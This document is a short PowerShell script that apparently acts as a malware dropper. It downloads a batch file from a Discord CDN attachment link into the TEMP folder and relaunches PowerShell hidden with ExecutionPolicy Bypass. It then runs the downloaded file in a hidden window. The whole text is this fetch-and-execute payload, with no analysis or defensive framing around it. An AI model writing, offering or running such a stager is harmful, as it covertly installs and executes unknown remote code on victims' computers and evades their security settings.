$batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159187492558360757/Uni.bat" 
$batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.bat") 
iwr -Uri $batUrl -OutFile $batPath 
 
$psScript = { 
    Start-Process -FilePath powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Wait 
} 
 
$psJob = Start-Job -ScriptBlock $psScript 
 
if (Test-Path $batPath) { 
    Start-Process -FilePath $batPath -WindowStyle Hidden 
} 
 
$psJob | Wait-Job 
$psJob | Remove-Job
